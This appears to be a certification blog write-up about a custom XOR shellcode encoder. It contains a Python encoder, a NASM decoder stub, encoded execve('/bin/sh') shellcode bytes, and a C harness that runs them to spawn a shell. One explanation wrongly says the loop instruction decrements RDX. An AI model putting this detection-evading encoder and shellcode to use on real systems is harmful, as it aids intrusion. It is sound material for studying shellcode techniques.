Assignment #4 – Custom Encoder
==============================

The objective of this assignment was to create a custom encoding scheme for shellcodes; and write a proof-of-concept that would decode a stack-based `execve` shellcode and executed it.

Encoder design
--------------

After thinking a bit I decided I wanted to design a simple encoding scheme that would xor consecutive bytes of the shellcode. I also decided I wanted a scheme that would make it possible to encode the same input into different outputs.

### The encoder

A diagram for the encoder can be seen below. Each cell is a byte. `n` is an arbitrary byte you can choose so that different encodings can be generated for the same shellcode.

The first byte of the shellcode (`i0`) is xored with `n`, resulting in an encoded byte `o0`. Then, the second byte of the input (`i1`) is xored with the first encoded byte (`o0`) to produce `o1`. And the process repeats until all shellcode bytes have been encoded.

    +-----+-----+-----+-----+-----+
    |  n  | i0  | i1  | i2  | i3  |
    +-----+-----+-----+-----+-----+
      |     ↓     ↓     ↓      ↓
      | ┌--→⊕ ┌--→⊕ ┌--→⊕ ┌---→⊕
      ↓ |   ↓ |   ↓ |   ↓ |    ↓
    +-----+-----+-----+-----+-----+
    |  n  | o0  | o1  | o2  | o3  |
    +-----+-----+-----+-----+-----+

### The decoder

From the diagram of the encoder and knowing that `a XOR b = c` and `c XOR b = a` we notice that by xoring two consecutive bytes of the output we can obtain one byte of the shellcode. For example `o1 XOR o2 = i2`.

Implementation
--------------

### Encoder

I wrote the encoder in Python. The shellcode is passed as an argument. A second argument can be used to pass byte `n`, which if not provided will be chosen randomly. The script produces two different output formats.

    #!/usr/bin/env python3
    import sys
    from random import randint

    shellcode = bytes.fromhex(sys.argv[1].replace('\\x', ''))

    if len(sys.argv) == 3:
        output = [int(sys.argv[2], 0)]
    else:
        output = [randint(1, 255)]

    for b in shellcode:
        xored_byte = b ^ output[-1]
        output.append(xored_byte)

    output = bytes(output)

    print()
    print(''.join(['\\x{:02x}'.format(b) for b in output]))
    print()
    print(','.join(['0x{:02x}'.format(b) for b in output]))

Below an example of encoding a stack-based `execve` shellcode using `n = 0xaa`.

    $ ./seq-xor-encoder.py '\x31\xc0\x50\x54\x5a\x48\xbe\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x54\x5f\x50\x57\x54\x5e\xb0\x3b\x0f\x05' 0xaa

    \xaa\x9b\x5b\xb\x5f\x5\x4d\xf3\xdc\xbe\xd7\xb9\x96\xb9\xca\xa2\xf4\xa0\xff\xaf\xf8\xac\xf2\x42\x79\x76\x73

    0xaa,0x9b,0x5b,0xb,0x5f,0x5,0x4d,0xf3,0xdc,0xbe,0xd7,0xb9,0x96,0xb9,0xca,0xa2,0xf4,0xa0,0xff,0xaf,0xf8,0xac,0xf2,0x42,0x79,0x76,0x73

### Decoder

Below you can see a NASM implementation for the decoder.

    global _start

    _start:
        jmp decoder
        encoded_shellcode: db 0xaa, 0x9b,0x5b,0xb,0x5f,0x5,0x4d,0xf3,0xdc,0xbe,0xd7,0xb9,0x96,0xb9,0xca,0xa2,0xf4,0xa0,0xff,0xaf,0xf8,0xac,0xf2,0x42,0x79,0x76,0x73
        shellcode_len: db $ - encoded_shellcode

    decoder:
        xor ecx, ecx
        lea rdx, [rel shellcode_len]
        mov cl, [rdx]
        sub rdx, rcx
        mov al, [rdx]

    decoder_loop:
        inc rdx
        xchg [rdx], al
        xor [rdx], al
        loop decoder_loop
        jmp encoded_shellcode + 1

First we have the encoded shellcode we obtained in the previous section and a byte representing its length. The decoder proper starts by loading the address where the length is stored into RDX. Then the length is loaded into CX. Then RDX is adjusted to point to the start of the shellcode. This could be done directly with a `lea rdx, [rel encoded_shellcode]` but this would take more bytes because the relative address alone would take four bytes (you can try it yourself). Finally we load the byte corresponding to `n` into AL.

Now we have a loop. This loop xors consecutive bytes of the encoded shellcode to obtain the original shellcode. The encoded bytes are overwritten with the decoded ones. Since we are overwriting the encoded byte but need it to decode the next byte, we need to store the former somewhere. By swapping the previous encoded byte (in AL) with the current encoded byte (pointed to by RDX) the former will be kept in AL to be used in the next iteration. Then we can xor the two values and obtain the decoded byte and can move to the next iteration. The same could be accomplished by using an auxiliary register, but the solution with `xchg` results in a shorter decoder.

    decoder_loop:
        inc rdx
        mov bl, [rdx]
        xor [rdx], al
        mov al, bl
        loop decoder_loop

When will the loop end? Each time `loop` is executed RDX is decremented: if it becomes zero, execution continues to the next instruction; otherwise it continues at the label provided to `loop`, which is `decoder_loop` in this case. Once the loop finishes the full shellcode has been decoded. So now we can jump to it and continue execution. You may have noticed in fact the jump is to `encoded_shellcode + 1`. Why? Because we need to skip the byte for `n`, which is not part of the shellcode.

A quick check reveals no null bytes. We're good.

    $ nasm -felf64 seq-xor-decoder.nasm
    $ objdump -M intel -d seq-xor-decoder.o | grep " 00"

Conclusion
----------

All that's left to do is test the decoder.

    $ objdump -d seq-xor-decoder.o | grep -P ":\t" | cut -f2 | tr -d ' \n' | sed -e 's/../\\x&/g'; echo
    \xeb\x1c\xaa\x9b\x5b\x0b\x5f\x05\x4d\xf3\xdc\xbe\xd7\xb9\x96\xb9\xca\xa2\xf4\xa0\xff\xaf\xf8\xac\xf2\x42\x79\x76\x73\x1b\x31\xc9\x48\x8d\x15\xf6\xff\xff\xff\x8a\x0a\x48\x29\xca\x8a\x02\x48\xff\xc2\x86\x02\x30\x02\xe2\xf7\xeb\xca

Place it in a testing stub.

    #include <stdio.h>
    #include <string.h>

    char code[] =
    "\xeb\x1c\xaa\x9b\x5b\x0b\x5f\x05\x4d\xf3\xdc\xbe\xd7\xb9\x96\xb9\xca\xa2"
    "\xf4\xa0\xff\xaf\xf8\xac\xf2\x42\x79\x76\x73\x1b\x31\xc9\x48\x8d\x15\xf6"
    "\xff\xff\xff\x8a\x0a\x48\x29\xca\x8a\x02\x48\xff\xc2\x86\x02\x30\x02\xe2"
    "\xf7\xeb\xca";

    int main() {
        printf("length: %lu\n", strlen(code));
        ((int(*)()) code)();
    }

    $ gcc -Wall -z execstack shellcode.c -o shellcode
    $ ./shellcode
    length: 57
    sh-5.0$ whoami
    goncalor

The shellcode was decoded and executed as intended.

That's all. Thank you for reading.

----

This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert][SLAE64] certification.

Student ID: SLAE64-1635

[SLAE64]: https://www.pentesteracademy.com/course?id=7
